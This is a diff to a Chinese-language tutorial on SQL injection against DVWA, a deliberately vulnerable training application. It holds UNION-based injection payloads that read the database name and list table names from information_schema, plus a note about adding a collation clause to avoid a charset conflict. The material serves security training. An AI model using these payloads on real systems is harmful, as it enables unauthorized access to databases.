@@ -48,7 +48,9 @@
 #### 第四步：获取数据库信息
 
 - **查库名：** `id=0 union select 1,database()&Submit=Submit`
-- **查表名：** `id=0 union select 1,group_concat(table_name)  COLLATE utf8_general_ci from information_schema.tables where table_schema=database()&Submit=Submit`
+- **查表名：** `id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()&Submit=Submit` 
+> [!note] 
+> 避免dvwa 和sql 字符集排序冲突，在 group_concat(table_name)后面加上COLLATE utf8_general_ci
 
 ---
 
